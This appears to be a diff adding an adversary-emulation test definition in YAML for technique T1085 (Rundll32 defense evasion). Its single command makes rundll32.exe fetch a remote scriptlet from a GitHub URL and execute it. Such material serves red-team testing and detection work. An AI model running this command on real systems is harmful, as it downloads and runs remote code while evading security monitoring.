@@ -1,0 +1,15 @@
+---
+
+- id: 03afada1-1714-408f-bde5-f528b91dT1085
+  name: Rundll32 execute JavaScript Remote Payload With GetObject
+  description: The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations. 
+  tactic: defense-evasion
+  technique:
+    attack_id: T1085
+    name: Rundll32
+  platforms:
+    windows:
+      cmd:
+       command: |
+         rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"
+
